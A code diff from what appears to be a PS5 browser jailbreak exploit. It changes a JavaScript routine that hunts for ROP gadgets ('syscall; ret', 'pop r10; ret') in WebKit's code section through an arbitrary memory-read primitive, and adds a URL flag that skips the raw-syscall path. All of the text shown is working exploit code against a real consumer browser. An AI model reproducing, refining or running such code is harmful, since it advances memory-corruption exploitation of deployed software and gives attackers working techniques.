@@ -224,30 +224,22 @@ async function prepare(p) {
     // `mov [rdi],rax`, the classic pop-rax chain works without libkernel.
     let rawSyscall = false;
     function scanWkPat(pat) {
-        // Pass 1: first 8 MB — fast, minimal memory pressure.
-        // Pass 2: 8-16 MB — only when pass 1 misses both gadgets.
-        // The old 0x2c7c000 (46.7 MB) scan ran BEFORE new Worker() and
-        // exhausted the PS5 browser heap -> "not enough free memory".
-        const CHUNK = 0x4000, OVER = 16;
+        // Scan WebKit .text with the plain `read4` primitive (returns a
+        // number, allocates nothing). The old array_from_address() approach
+        // re-pointed a GC-tracked typed array at .text and mutated its length
+        // every chunk — that is what triggered the PS5 "not enough free
+        // memory" dialog. read4 has no fake arrays and no GC pressure.
+        if (pat.length !== 3) return null;
+        const target = (pat[0] & 0xff) | ((pat[1] & 0xff) << 8) | ((pat[2] & 0xff) << 16);
         const PASSES = [0x800000, 0x1000000]; // 8 MB then 16 MB
-        let view = null;
-        try { view = array_from_address(libSceNKWebKitBase.add32(0), CHUNK + OVER); }
-        catch (e) { return null; }
+        let from = 0;
         for (let pass = 0; pass < PASSES.length; pass++) {
-            const start = pass === 0 ? 0 : PASSES[pass - 1];
-            const end   = PASSES[pass];
-            for (let off = start; off < end; off += CHUNK) {
-                const chunkEnd = Math.min(CHUNK + OVER, end - off);
-                const scanLen  = Math.min(CHUNK, end - off);
-                try { view.setAddr(libSceNKWebKitBase.add32(off), chunkEnd); }
-                catch (e) { continue; }
-                outer:
-                for (let i = 0; i + pat.length <= scanLen; i++) {
-                    for (let j = 0; j < pat.length; j++)
-                        if ((view[i + j] & 0xff) !== pat[j]) continue outer;
-                    return libSceNKWebKitBase.add32(off + i);
-                }
+            const to = PASSES[pass];
+            for (let off = from; off + 3 <= to; off++) {
+                if ((p.read4(libSceNKWebKitBase.add32(off)) & 0xFFFFFF) === target)
+                    return libSceNKWebKitBase.add32(off);
             }
+            from = to;
         }
         return null;
     }
@@ -260,6 +252,10 @@ async function prepare(p) {
         if (rawScanned) return rawSyscall;
         rawScanned = true;
         try {
+            if (/[?&]noraw=1/.test(location.search || "")) {
+                jbmark("WK-RAW-SKIP", "noraw=1");
+                return false;
+            }
             const gSyscall = scanWkPat([0x0f, 0x05, 0xc3]);
             const gPopR10 = scanWkPat([0x41, 0x5a, 0xc3]);
             if (gSyscall !== null) gadgets["syscall"] = gSyscall;
